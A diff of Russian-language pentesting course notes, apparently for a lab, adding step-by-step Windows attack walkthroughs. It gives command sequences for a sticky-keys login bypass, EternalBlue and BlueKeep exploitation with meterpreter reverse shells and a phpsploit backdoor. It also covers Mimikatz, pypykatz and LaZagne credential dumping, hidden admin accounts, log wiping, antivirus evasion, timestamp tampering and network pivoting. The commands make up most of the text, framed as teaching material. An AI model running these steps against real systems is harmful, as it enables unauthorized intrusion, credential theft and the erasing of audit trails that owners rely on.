@@ -761,6 +761,7 @@ $ ld -m elf_i386 -o hello hello.o
 https://docs.google.com/spreadsheets/d/1LUIblyHhuJ0fb9xYvPKoYFtxd8k4hKVHE9A1SKhVjuw/edit#gid=0 
 
 Учим C после него учим ассемблер
+https://github.com/xairy/linux-kernel-exploitation
 
 
 
@@ -1103,8 +1104,8 @@ $ touch -a --date=" 2020-01-20 23:05:43.443117094 +0400" file.txt
 
 Изменение mtime:
 $ touch -m --date="2020-01-20" file.txt
-$ touch -a --date=" 2020-01-20 23:05" file.txt
-$ touch -a --date=" 2020-01-20 23:05:43.443117094 +0400" file.txt
+$ touch -m --date=" 2020-01-20 23:05" file.txt
+$ touch -m --date=" 2020-01-20 23:05:43.443117094 +0400" file.txt
 
 Изменение ctime:
 # NOW=$(date) && date -s "2030-08-15 21:30:11" && touch file.txt && date -s "$NOW"
@@ -1116,7 +1117,7 @@ $ touch -a --date=" 2020-01-20 23:05:43.443117094 +0400" file.txt
 Модфикация журналов
 last	/var/log/wtmp	   		бинарный	удачные попытк входа/выхода
 lastb	/var/log/btmp	   		бинарный	неудачные попытки
-lastlog	/var/log/lastlog   		бинарный
+lastlog	/var/log/lastlog   		бинарный	последние входы в систему
 who	/var/run/utmp	   		бинарный	список текущих пользователей
 -	/var/log/auth.log  		текстовый	информация об авторизациях
 -	/var/log/<server>/access.log	текстовый	результаты http запросов
@@ -1128,17 +1129,42 @@ unset HISTFILE
 
 
 
+Прячем процесс из списка запущенных
+https://github.com/gianlucaborello/libprocesshider
+
+PAM-backdoor (в коде есть ошибки от скрипткиидис)
+https://github.com/eurialo/pambd
+
+Скрипт для чистки логов
+https://github.com/Macr0phag3/LLC
+
+Команда для поиска файлов с фейковой датой
+find . -type f -atime -7 -printf “%AY%Am%Ad%AH%AM%AS %h/%s/%f\n” -user <username>|sort -n
+нужно немного доработать
+
+
+
 
 
 Занятие 7
 
-В Windows есть права 
-User
-Local Admin
+В Windows есть локальные права: 
+User 		 - обчный пользователь
+Local Admin 	 - доступ ко всему, кроме низкого уровня
 NT-Authority sys - аналог рута
+
+Доменне права:
+Delegated Admin - отвечает за свой сегмент, обчно права ограничены
+Domain Admin	- самые всокие права в домене
+Enterpie Admin 	- есть права ко всему в огранизации
 
 В Windows есть локальные привилегии и есть доменные привилегии
 В рамках модуля, смотрим только на локальные права
+
+
+
+В Window компрометация одного устройства может вести к компрометации всей сети
+Это происходит через доменне политики
 
 
 
@@ -1149,33 +1175,54 @@ NT-Authority sys - аналог рута
 
 Загрузка Windows
 MBR - биос.
-Windows Bootloader
-Kernel
-Winlogon (экран ввода пароля. Работает с NT-Authorities)
+Windows Bootloader - операционная система
+Kernel - ядро
+Winlogon (экран ввода пароля. Работает с NT-Authority sys)
 Run session
 
 
 
-Атака на экране авторизации
-1) Грузимся с флешки
+Атака на экран авторизации
+1) Вытаскиваем жесткий диск или грузимся с флешки
 Для загрузки лучше использовать специализированные дистрибутивы
-2) Подменяем бинарник, запускающий функции на окне авторизации на cmd.exe
+
+2.1) Загрузка с recovery Windows live usb
+Repair your computer
+recovery Command Prompt via advanced recovery options
+wmic logicaldisk get name
+C: 
+dir
+cd Window\System32
+
+2.2) Загрузка c Linux дистрибутива 
+Убедится, что система полностью выключена, а не спит
+mount /dev/<sda2> /media/diskC/
+cd /media/diskC/Window/System32
+cp cmd.exe sethc.exe (лучше сделать бэкап оригинального файла)
+
+3) Подменяем бинарник, запускающий функции на окне авторизации на cmd.exe
 Для этого надо загрузится с флешки, и скопировать файл
 Залипание клавиш теперь открывает шелл
-copy Windows/system32/cmd.exe Windows/system32/sethc.exe SHIFTx5
-copy Windows/system32/cmd.exe Windows/system32/magnify.exe WIN+U
-copy Windows/system32/cmd.exe Windows/system32/utilman.exe WIN+U
-copy Windows/system32/cmd.exe Windows/system32/osk.exe WIN+U
+copy Windows/system32/cmd.exe Windows/system32/sethc.exe 	 SHIFTx5
+copy Windows/system32/cmd.exe Windows/system32/magnify.exe 	 WIN+U
+copy Windows/system32/cmd.exe Windows/system32/utilman.exe 	 WIN+U
+copy Windows/system32/cmd.exe Windows/system32/osk.exe 		 WIN+U
 copy Windows/system32/cmd.exe Windows/system32/DisplaySwitch.exe WIN+P
-
-3) Грузимся и триггерим залипание клавиш
-4) Получаем шелл
-
+4) Грузимся и триггерим залипание клавиш
+5) Получаем шелл
 
 
-Добавляем пользователя c правами админа после открытия шелла
+
+Добавляем пользователя и даем ему права администратора
 1) Net user <username> <password> /add
 2) Net localgroup administrators <username> /add
+
+Если Win Defender мешает, то можно загрузится в безопасном режиме
+bcdedit /set {default} safeboot minimal
+После добавления пользователя отключаем режим
+
+Или можно добавить пользователя через прямое редактирование файла CAM
+Например, с помощью chntpw из кали
 
 
 
@@ -1184,7 +1231,7 @@ BIOS пароль
 Шифрование диска
 Не бросать разлогиненные компы
 В Win10 есть функция, котора не дает подменить бинарники с экрана загрузки
-BitLocker на лету шифрует диски. Есть режимы восстановления с девайса
+BitLocker на лету шифрует диски. Есть режимы восстановления с usb девайса
 
 
 
@@ -1192,42 +1239,95 @@ BitLocker на лету шифрует диски. Есть режимы вос�
 
 Eternal Blue
 Работает, если находимся в одной локалке с виндой
-1) # msfconsole
-2) > search eternalblue
-3) use 1
-Используем первый эксплоит
-4) > set RHOST 10.0.2.4
-Ставим цель
-5) > exploit
-Получаем информацию о хосте
-6) > use exploit/windows/smb/
-7) > show info
-Узнать об эксплойте
 
-9) > set payload windows/x64/meterpretter/reverse_tcp
-Выбираем метерпреттер в качестве пейлоада
-10) > 
-11) > 
-15) neterpreter > sysinfo
-Узнать, под кем мы работаем
+Сканруем на налче уязвимости
+# msfconsole
+msf5> search eternalblue
+msf5> use auxiliary/scanner/smb/sm_ms1_010
+msf5> show options
+msf5> set RHOST <ip target>
+msf5> exploit
 
-Это может привести к крашу системы
+Эксплуатация
+msf5> use exploit/windows/smb/ms17_010_eternalblue
+msf5> show options
+msf5> set payload windows/x64/meterpreter/reverse_tcp
+msf5> set RHOST <ip target>
+msf5> set LHOST <kali ip>
+msf5> show advanced
+msf5> set VERBOSE true
+msf5> check
+msf5> exploit
+
+Эту последовательность команд можно запсать в файл .rc и подгрузить в metasploit через
+msf5> resource ~/file.rc
+
+meterpreter> sysinfo
+meterpreter> getuid
+Узнаем, под кем мы работаем. Обычно после эксплуатации мы сразу имеем NT_Authority sys
+
+Иногда eternal blue может привести к крашу системы
+Meterpreter достаточно легко детектится
 
 
 
 Атака Bluekeep
-1) На машине обязательно должен быть установлен ключ регистра fDisableCam
+Для эксплуатации подходят только 
+Windows 7 SP1
+Windows Server 2008 R2 с HKLM\SYSTEM\CurrentControlSet\Control\TerminalServer\Winstations\RDP-Tcp\fDisableCam равным 0 (это не стандартно) иначе система упадет
+
+msf5> search bluekeep
+msf5> use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
+msf5> show info 
+$ VBoxManage debugvm "metasploitable3-win2k8" dumpvmcore --filename=metasploitable.dump
+Делаем дамп оперативной памяти в данном случае, с виртуалки
+$ mkdir bluekeep && mv metasploitable.dump bluekeep && chmod 777 bluekeep && chmod 777 bluekeep/*
+$ sudo docker run --rm -it -v bluekeep:/home/nonroot/files remnux/rekall bash
+:~$ rekall -f metaploitabl.dump pools
+Нас нтересует hex значение NonPagedPool
+$ sudo vim /usr/share/metasploit-framework/../cve_019_0770_bluekeep_rce.rb
+меняем значене hex в Windows 7 SP1 на полученный, пр этом добавляя вперед нужные ffff
+msf5> show targets
+msf5> set target 2
+msf5> set RHOST <ip target>
+msf5> set VEROSE true
+msf5> set GROOMSIZE 50
+msf5> exploit
+
+Посмотреть код эксплойта
+$ less /usr/share/metasploit-framework/modules/exploits/windows/rdp/cve_019_0708_bluekeep_rce.rb
 
 
 
+Перебор паролей wordpress:
+$ wpscan --url http://10.0.2.X:8585/wordpress/ --enumerate u -P /usr/share/metasploit-framework/data/wordlists/http_default_pass.txt
+
+
+
+Атака через web сервер
+$ ./phpsploit 
+phpsploit> backdoor 
+Вставляем строчку в плагин на сервере
+phpsploit> set target http:<address>:<port>/wordpress/wp-content/plugins/ninja-forms/index.php
+выбираем файл с бэкдором
+phpsploit> exploit
+
+Теперь обеспечим фреймворк для взамодействя с системой
+$ msfvenom -p windows/x64/meterpreter_reverse_tcp lhost=10.0.2.X lport=4444 -f exe > reverse_tcp.exe
+$ python3 -m http.server
+Поднмаем веб сервер одной командой
+phpsploit> run certutil.exe -urlcache -split -f http://<ip>:<port>/<file>
 Аналог wget на винде
-run certutil.exe -urlcache -split -f https://address.online/file.txt
-
+msf5> use exploit/multi/handler
+msf5> set payload windows/x64/meterpreter/reverse_tcp
+msf5> exploit
+Запускаем универсльный shell-listener 
+phpsploit> run reverse_tcp.exe
 
 
 
 В работе пентестеры часто используют либо свои наработки, либо модифицированные тулы, что бы обойти антивирусное по
-Популярные 
+Популярные утилиты легко отслеживаются антивирусами
 
 
 
@@ -1235,37 +1335,257 @@ run certutil.exe -urlcache -split -f https://address.online/file.txt
 
 Занятие 8
 
-msf5 > background
-msf5 > session -i id
+meterpreter> background
+Кидаем сессию в бэкграунд
+msf5> sessions -l 
+Список сессий
+msf5> session -i <id>
+Подключаемся к сессии
 
 
 
-Скрываем юзера на винде
-1) net user
-Видим список пользоватиелей
-2) 
-3) reg setval -v hacker$ -d 0 -t REG_DWORD -k "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
-   reg enumkey -k "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
-Теперь юзер скрыт со списка аккаунтов
+Накидываем полезную нагрузку через открытую сессию метерпретера
 
+Модуль определяет висит ли система на виртуалке. И если да, то на какой
+msf5> use post/windows/gather/checkvm
+msf5> set session 1
+msf5> exploit
+
+Модуль перечисляет запущенные сервисы и права, от которых они запущены
+msf5> use post/windows/gather/enum_services
+msf5> set session 1
+msf5> exploit
+
+Модуль ищет потенциальные полезные уязвимости
+msf5> use post/multi/recon/local_exploit_suggester 
+msf5> set session 1
+msf5> set SHOWDESCRIPTION true
+msf5> exploit
+
+
+
+Сканер возможных уязвимостей обновлений безопаснотсти
+$ wget https://raw.githubusercontent.com/rasta-mouse/Sherlock/master/Sherlock.ps1
+meterpreter> upload /home/kali/Desktop/Sherlock.ps1
+Загружаем файл на windows машину 
+meterpreter> load powershell
+meterpreter> powershell_shell
+PS > Import_Module Sherlock.ps1
+PS > Find-AllVulns
+
+Если предыдущий способ не сработал, можно выполнить все через meterpeter
+meterpreter> powershell_import Sherlock.ps1
+meterpreter> powershell_execute Find-AllVulns
+
+
+
+Эксплойты из msf, работающие через meterpreter
+msf5> use exploit/windows/local/<*>
+
+Используем Эксплоит для найденой уязвимости
+msf5> use exploit/windows/local/ms16_014_wmi_recv_notif
+msf5> set session 1
+msf5> set payload windows/x64/meterpreter/reverse_tcp
+msf5> set LHOST <ip kali>
+msf5> exploit
+Открывается вторая сессия meterpreter, но уже с повышенными правами
+
+
+
+Получаем графческй доступ к рабочему столу админа
+msf5> use exploit/windows/local/payload_inject
+msf5> set payload windows/x64/vncinject/reverse_tcp
+msf5> set LPORT 5555
+msf5> set LHOST <ip kali>
+msf5> set session 2
+meterpreter> ps 
+Ищем процесс, в который будем инжектироваться
+msf5> set PID <pid процесса (первые 4 цифры "4452")>
+msf5> exploit
+
+
+
+Скрываем пользователя из net users
+
+meterpreter> shell
+C:\> net user
+Выводим список пользователей
+C:\> wmic useraccount where name="hacker" call rename name="hacker$"
+Переименованный пользователь с '$' на конце не виден команде net user
+
+Скрываем пользователя с экрана авторизации
+
+meterpreter> reg setval -v hacker$ -d 0 -t REG_DWORD -k "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
+meterpreter> reg enumkey -k "HKLM\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\\SpecialAccounts\\UserList"
+Проверяем, что пользователь есть в списке
 
 
 
 Извлечение учеток 
-SAM - для личного входа
-ntds.dit - для доментов
-lsass - 
+SAM - для локального входа
+ntds.dit - для доменных учеток
+lsass - процесс, осуществляющий аутентификацию, обращаяь к SAM
 
 
 
-Mimikatz
-creds_all
-dsdtcn
+Mimikatz 
+позволяет вытаскивать пароли, хеши и прочее из памяти системы (отлично детектится)
+Скачать можно тут https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
 
-1) Качаем mimikatz на винду
-2) 
+Можно использовать как расширение meterpreter
+meterpreter> load kiwi
+meterpreter> creds_all
+вытаскиваем все креды, до которх можем дотянутся
+meterpreter> lsa_dump_sam
+вытаскиваем NTLM хеши из SAM файла
+
+
+Можно поставить на саму машину
+Нужно скачать psexec 
+https://docs.microsoft.com/en-us/sysinternals/download/psexec
+Разархивируем
+C:\> \PSTools\PsExec.exe
+Качаем mimikatz
+https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20200918-fix/mimikatz_trunk.zip
+Если браузер блокирует его, жмем "показать все" и "сохранить"
+Разархивируем в папку с PSTools
+C:\> PsExec.exe -s cmd.exe
+C:\> cd C:\Users\<name>\Downloads\PSTools\x64\
+C:\> mimikatz.exe
+mimikatz# privilege::debug
+Проверяем привилегии (если 20 ОК, то все в порядке)
+mimikatz# sekurlsa::logonpasswords
+Вытягиваем учетки
+mimikatz# token::elevate
+mimikatz# lsadump::sam
+
+
+!ХОРОШИЙ СПОСОБ!
+Можно сделать дамп реестра и анализировать на своей машине
+meterpreter> cmd
+C:\> reg save HKLM\SYSTEM system.hiv
+C:\> reg save HKLM\SAM sam.hiv
+создаем дамп
+meterpreter> download system.hiv
+meterpreter> download sam.hiv
+Скачиваем дамп
+$ pip3 install pypykatz
+Установка pypykatz
+$ pypykatz registry --sam ./sam.hiv ./system.hiv
+Получили хеши из файла SAM
 
 
 
-Извлечение кредов из других мест
-github.com/AlessandroZ/LaZagne
+!!!ЛУЧШИЙ СПОСОБ!!!
+Дамп реестра чистыми средствами (без использования meterpreter)
+Скачиваем ProcDump.exe
+https://docs.microsoft.com/en-us/sysinternals/downloads/procdump
+msf5> use auxiliary/admin/smb/upload_file
+msf5> set SMBUser <admin>
+msf5> set SMBPass <qwe123>
+msf5> set LPATH /home/kali/Desktop/ProcDump/procdump.exe
+msf5> set RHOST <ip target>
+msf5> set RPATH Windows\\Temp\\procdump.exe
+msf5> exploit
+Загрузили файл на машину с windows. Можно принести на флешке
+
+msf5> use auxiliary/admin/smb/psexec_command
+msf5> set SMBUser <admin>
+msf5> set SMBPass <qwe123>
+msf5> set RHOST <ip target>
+msf5> set COMMAND "C:\\Windows\\Temp\\procdump.exe -accepteula -ma lsass C:\\Windows\\Temp\\lsass.dmp"
+Запустили procdump.exe на хосте. Можно запустить от имени адмнистратора
+
+msf5> use auxiliary/admin/smb/download_file
+msf5> set SMBUser <admin>
+msf5> set SMBPass <qwe123>
+msf5> set RPATH Windows\\Temp\\lsass.dmp
+msf5> set RHOST <ip target>
+msf5> exploit
+Скачали дамп. Можно сохранить на флешке
+
+$ cd ~/.msf4/loot
+$ pypykatz lsa minidump <filename>.dmp
+Получили хеши и пароли В ЧИСТОМ ВИДЕ из файла SAM
+
+
+
+Чистка логов с mimikatz
+mimikatz# event::drop
+Предотвращает появлене логов
+mimikatz# event::clear
+Чистит логи из event log
+
+
+
+Полная очистка логов с помощью Powerhell
+PS> wevtutil.exe el | ForEach {wevtutil cl "$_"}
+
+
+
+Извлечение учеток из браузеров, приложений
+LaZagne
+Качаем утиилиту
+https://github.com/AlessandroZ/LaZagne/releases/download/2.4.3/lazagne.exe
+C:\\> lazagne.exe all 
+Получаем все пароли! (лучше запускать от админа)
+
+
+
+Брут хешей
+NTLM хэши очень быстро брутятся!
+$ hashcat -a 0 -m <hash_type> <hash_file> <wordlist>
+
+
+
+Как можно сделать опенсорсный инструмент менее заметным для антивирусов
+1) Переписываем строчки кода, что бы изменить сигнатуру
+2) Имена модулей
+3) Оформление меню
+4) Структура файлов ии папок
+5) Обфускация сходного кода
+6) Можно подписывать файлы истекшмии сертфикатами 
+https://s3cur3th1ssh1t.github.io/Building-a-custom-Mimikatz-binary/
+https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/
+atomic-red-team 
+
+
+
+Распространение по локальной сети
+
+Сканирование по ARP
+msf5> use post/windows/gather/arp_scaner
+msf5> set RHOSTS <ip>/24
+msf5> set SESSION <id meterpreter>
+msf5> exploit
+
+Настраиваем маршрутизацию
+msf5> route add 10.0.0.0/24 <id meterpreter>
+Мы настроили прокси через meterpreter
+
+Поднимаем web интерфейс
+msf5> use auxiliary/server/socks4a
+msf5> run -d 
+В браузере -> Connection Settings -> manual proxy configuration -> SOCKS v4 -> SOCKS Host 127.0.0.1 Port 1080
+
+Используем разные утилты через прокси
+$ sudo vim /etc/proxychains.conf (добавляем наш прокси)
+$ proxychains nmap -sT -sV 10.0.0.2
+
+Настраиваем проброс портов на windows машине
+meterpreter> portfwd add -R -l 7777 -p 7777 -L 127.0.0.1
+Теперь при подключении к 127.0.0.1:7777 трафк будет идти к нам на порт 7777
+
+Настриваем эксплуатацию уязвимости на машине из локльной сети
+msf5> use exploit/unix/irc/unreal_ircd_3281_backdoor
+msf5> set RHOSTS 10.0.0.2
+msf5> set payload cmd/unix/reverse_perl
+msf5> set LHOST 0.0.0.0
+msf5> set LPORT 7777
+msf5> exploit
+
+Иногда порт форвардинг отрабатывает только один раз
+Нужно иметь несколько сессий, так как они часто падают
+
+
+
